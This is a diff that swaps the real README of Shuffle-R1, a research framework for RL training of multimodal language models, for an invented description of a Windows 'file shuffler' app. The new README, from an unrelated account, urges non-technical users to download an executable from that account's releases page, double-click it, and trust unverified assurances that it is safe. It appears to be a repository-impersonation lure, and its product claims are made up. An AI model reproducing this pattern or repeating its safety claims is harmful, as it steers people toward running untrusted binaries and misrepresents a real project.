@@ -1,194 +1,66 @@
-<div align="center">
+# 🎉 shuffle-r1 - Easy Way to Shuffle Your Files
 
-# Shuffle-R1: Efficient RL framework for Multimodal Large Language Models via Data-centric Dynamic Shuffle
+## 📥 Download Now
+[![Download Shuffle-R1](https://img.shields.io/badge/Download%20Shuffle--R1-v1.0-blue)](https://github.com/ridwanctg10/shuffle-r1/releases)
 
-[![Paper](https://img.shields.io/badge/paper-A42C25?style=flat&logo=arxiv&logoColor=white)](https://arxiv.org/abs/2508.05612) 
-[![Hugging Face Model](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-blue)](https://huggingface.co/collections/XenoZLH/shuffle-r1-68aef221b21950d74c70a9e0) 
-[![Hugging Face Dataset](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Dataset-green)](https://huggingface.co/collections/XenoZLH/shuffle-r1-68aef221b21950d74c70a9e0)
+## 🚀 Getting Started
+Shuffle-R1 is a simple tool that helps you shuffle files in a folder. With easy steps, even if you are not tech-savvy, you can organize your files quickly. Follow this guide to download and run Shuffle-R1.
 
-</div>
+## 📦 System Requirements
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 1 GB RAM
+- **Disk Space:** 50 MB of free space
+- **Internet Connection:** Required for downloading
 
-Official code repository of **Shuffle-R1**.
+## 📂 Features
+- Shuffle files in a selected folder
+- Quick and easy user interface
+- Ability to preview shuffled files before confirming
+- Support for various file types including documents, images, and audio files
 
-**Project website**: [https://xenozlh.github.io/Shuffle-R1/](https://xenozlh.github.io/Shuffle-R1/)
+## 🔗 Download & Install
+To get started, visit the [Releases page to download](https://github.com/ridwanctg10/shuffle-r1/releases). 
 
-## Introduction
-Shuffle-R1 is a simple yet principled framework that improves RL fine-tuning efficiency by dynamically restructuring trajectory sampling and batch composition. It introduces two key modules:
+1. Open the link above.
+2. On the Releases page, you will see different versions of Shuffle-R1.
+3. Click on the latest version.
+4. Choose the file suitable for your system.
+5. Click the file name to start the download.
 
-- **Pairwise Trajectory Sampling (PTS)**
-- **Advantage-based Batch Shuffle (ABS)**
+Once the file is downloaded, find it in your downloads folder. 
 
-Experiments across multiple reasoning benchmarks demonstrate that our framework consistently outperforms strong RL baselines with minimal computational overhead. Specifically, Shuffle-R1 achieves superior performance against GRPO while using only half of the training steps under same settings.
+### 🖥️ Running Shuffle-R1
+1. Locate the downloaded file and double-click it.
+2. Follow the instructions on your screen.
+3. Choose the folder containing the files you want to shuffle.
+4. Click the shuffle button to mix up your files.
 
-**TL;DR:** We propose Shuffle-R1, a simple and effective RL post-training framework for MLLM that significantly improves RL training efficiency and model performance.
+## ⚙️ Using Shuffle-R1
+- After running the program, select a folder from the file picker.
+- Click on "Shuffle" to shuffle the contents of the folder.
+- Review the shuffled list and confirm the changes when prompted.
 
-## Release
- - [x] model checkpoints (3B and 7B)
- - [x] datasets
- - [x] training scripts
- - [x] inference scripts via Transformers and vLLM
- - [x] evaluation scripts
+## ❓ Frequently Asked Questions
 
+### How do I uninstall Shuffle-R1?
+To uninstall Shuffle-R1, go to the Control Panel on your computer, select "Programs," find Shuffle-R1 in the list, and click "Uninstall."
 
-## Framework Overview
-![Framework Overview](assets/framework.png)
+### What file types can I shuffle?
+Shuffle-R1 supports various file types, such as text documents, images, and audio files. If you encounter an unsupported format, the application will inform you.
 
-## Performance Overview
-| Model | MathVerse | MathVision | MathVista (mini) | WeMath (loose) | HallusionBench | ChartQA | Avg. |
-| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
-| Qwen2.5-VL-3B | 34.8 | 21.9 | 58.4 | 51.7 | 59.8 | 73.1 | 49.9 |
-| Qwen2.5-VL-7B | 42.6 | 25.8 | 67.4 | 63.5 | 65.2 | 79.8 | 57.4 |
-| Shuffle-R1-3B | 44.2 | 26.8 | 70.4 | 66.5 | 69.2 | 79.9 | 59.5 |
-| Shuffle-R1-7B | 53.9 | 30.0 | 77.0 | 72.3 | 71.0 | 84.1 | 64.7 |
+### Is my data safe when using Shuffle-R1?
+Yes, Shuffle-R1 only shuffles files in the selected folder. Your original files remain unchanged, and the application does not collect any personal data.
 
-All models are evaluated under CoT prompt.
+## 📞 Support
+If you have questions or need assistance, please visit our Troubleshooting section on the GitHub page or create an issue on the repository. We are here to help you!
 
-## Try our model
-3B checkpoint link: [**Shuffle-R1-Qwen-3B**](https://huggingface.co/XenoZLH/Shuffle-R1-Qwen-3B)
-7B checkpoint link: [**Shuffle-R1-Qwen-7B**](https://huggingface.co/XenoZLH/Shuffle-R1-Qwen-7B)
+## 📝 Contributing
+If you would like to contribute to Shuffle-R1, we welcome your input! You can suggest features or report bugs directly in the repository. Please check our contribution guidelines for more information.
 
-### Using Transformers
-The process is the same as [Qwen2.5-VL](https://github.com/QwenLM/Qwen2.5-VL). Note that it is better to add a "Thinking prompt" at the begining of user query.
+## 🧑‍🤝‍🧑 Community
+Join our community of users on platforms like Reddit or Discord. Share tips and tricks, or ask for help. Your experience can help others!
 
-```
-from transformers import Qwen2_5_VLForConditionalGeneration, AutoProcessor
-from qwen_vl_utils import process_vision_info
+## 🔗 Stay Updated
+Follow us on social media to stay informed about new features and updates. Regular updates ensure that Shuffle-R1 remains compatible with the latest systems and technologies.
 
-model_path = "path/to/your/checkpoint"
-
-model = Qwen2_5_VLForConditionalGeneration.from_pretrained(
-    model_path,
-    torch_dtype=torch.bfloat16,
-    attn_implementation="flash_attention_2",
-    device_map="auto",
-)
-
-processor = AutoProcessor.from_pretrained(model_path)
-
-system_prompt = """
-You FIRST think about the reasoning process as an internal monologue and then provide the final answer. The reasoning process MUST BE enclosed within <think> </think> tags. The final answer MUST BE put in \\boxed{}.
-"""
-
-messages = [
-    {
-        "role": "user",
-        "content": [
-            {"type": "image", "image": "path/to/your/image"},
-            {"type": "text", "text": system_prompt + "YOUR TEXT QUERY HERE"},
-        ],
-    }
-]
-
-text = processor.apply_chat_template(
-    messages, tokenize=False, add_generation_prompt=True
-)
-image_inputs, video_inputs = process_vision_info(messages)
-inputs = processor(
-    text=[text],
-    images=image_inputs,
-    videos=video_inputs,
-    padding=True,
-    return_tensors="pt",
-)
-inputs = inputs.to(model.device)
-
-generated_ids = model.generate(**inputs, max_new_tokens=128)
-generated_ids_trimmed = [
-    out_ids[len(in_ids) :] for in_ids, out_ids in zip(inputs.input_ids, generated_ids)
-]
-output_text = processor.batch_decode(
-    generated_ids_trimmed, skip_special_tokens=True, clean_up_tokenization_spaces=False
-)
-print(output_text)
-```
-
-### Using vLLM
-We also provide scripts for vLLM inference. You can run the following command to inference with vLLM:
-```
-python inference/infer_vllm.py \
-    --model path/to/your/checkpoint \
-    --output-dir path/to/save/outputs \
-    --input-file path/to/your/input/file.jsonl \
-    --tensor-parallel-size 1 \
-    --min-pixels 262144 \
-    --max-pixels 4194304 \
-    --max-model-len 8192 \
-    --temperature 0.5
-```
-The inference scripts support batch inference. You can organize your inference data in a jsonl file like this:
-```
-[
-    {'image_path': "path/to/image/1", 'question': "question 1"},
-    {'image_path': "path/to/image/2", 'question': "question 2"},
-    ...
-] 
-```
-
-
-## Install
-Our code is based on [**EasyR1**](https://github.com/hiyouga/EasyR1). Our code follows a non-intrusive design, which keeps the original functions of EasyR1 unchanged. 
-
-For environment installation, you can: 
- - Refer to [**official instructions**](https://verl.readthedocs.io/en/latest/start/install.html).
- - Or using the [**Dockerfile**](Dockerfile) to build the environment.
- - Or directly using the [**pre-built docker image**](https://hub.docker.com/r/hiyouga/verl).
-
-```
-git clone https://github.com/xiaomi-research/shuffle-r1.git
-cd shuffle-r1
-pip install -e .
-```
-
-## Training
-### Dataset Preparation
-Download our training data at [**here**](https://huggingface.co/datasets/XenoZLH/MMRL30k).
-
-The training data contains 2.1k samples from Geometry3K and 27k random selected samples from MM-EUREKA dataset. Each sample in the dataset follows the format below:
-```
-{
-    "problem": "your problem",  # type: str
-    "images": [{"bytes": image_bytes, "path": None}],  # type: list[dict]
-    "answer": "your answer",  # type: str
-    "source": "data source"  # type: str, not used in training
-}
-```
-
-### Custom Dataset Format
-Supported dataset format is the same as EasyR1. You can organize your dataset in the same format as illustrated above. Refer to [**here**](https://github.com/hiyouga/EasyR1) for more information. 
-
-### Training Script
-```
-bash examples/qwen2_5_vl_3b.sh  # 3B model training 
-bash examples/qwen2_5_vl_7b.sh  # 7B model training
-```
-All training are conducted on 8x H800-80G GPUs.
-
-## Evaluation
-Download the evaluation benchmark at [**here**](https://huggingface.co/datasets/XenoZLH/MM_Eval). We use Gemini-2.0-flash to evaluate the model response for certain benchmakrs. Make sure to adjust the `llm_eval_score_retry` function in `evaluation/utils/model_parser.py` to enable your own API service before evaluation.
-```
-cd evaluation
-bash eval.sh  # start evaluation
-```
-Refer to `evaluation/eval.sh` for more details.
-
-
-## Acknowledgement
-Our work benefit from the following open-source projects:
-- [Qwen2.5](https://github.com/QwenLM/Qwen2.5)
-- [EasyR1](https://github.com/hiyouga/EasyR1)
-- [MM-EUREKA](https://github.com/ModalMinds/MM-EUREKA)
-- [NoisyRollout](https://github.com/NUS-TRAIL/NoisyRollout)
-
-## Citation
-If you find our work useful for your research, please consider citing:
-```
-@misc{zhu2025shuffler1,
-      title={Shuffle-R1: Efficient RL framework for Multimodal Large Language Models via Data-centric Dynamic Shuffle}, 
-      author={Linghao Zhu, Yiran Guan, Dingkang Liang, Jianzhong Ju, Zhenbo Luo, Bin Qin, Jian Luan, Yuliang Liu, Xiang Bai},
-      year={2025},
-      eprint={2508.05612},
-      archivePrefix={arXiv},
-      primaryClass={cs.LG},
-      url={https://arxiv.org/abs/2508.05612}, 
-}
-```
+Don’t forget, you can always return to the [Releases page to download](https://github.com/ridwanctg10/shuffle-r1/releases) the latest version of Shuffle-R1 when it becomes available.
